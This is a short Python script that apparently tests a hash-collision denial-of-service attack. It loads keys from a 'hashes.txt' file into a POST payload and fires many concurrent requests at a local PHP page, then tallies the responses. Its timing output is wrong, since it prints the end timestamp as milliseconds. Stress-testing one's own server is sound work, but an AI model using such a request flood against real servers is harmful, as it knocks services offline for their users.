#!/bin/env python
import grequests
import time
import sys


if __name__ == "__main__":
    host = "http://localhost:8080"
    payload = {}
    count = int(sys.argv[1])

    with open("hashes.txt") as fh:
        for i, line in enumerate(fh):
            payload[line.strip()] = i

    print("Payload:")
    print(payload)

    reqs = []
    for i in range(0, count):
        url = host + "/index.php"
        print("POST {0}".format(host))
        reqs.append(grequests.post(url, data=payload))

    start = time.time()
    responses = grequests.map(reqs)
    end = time.time()

    print("Made {0} requests in {1}ms".format(count, end))
    successful_responses = [resp for resp in responses if resp.status_code == 200]
    failed_responses = [resp for resp in responses if resp.status_code != 200]
    print("Successful: {0}".format(len(successful_responses)))
    print("Failed: {0}".format(len(failed_responses)))
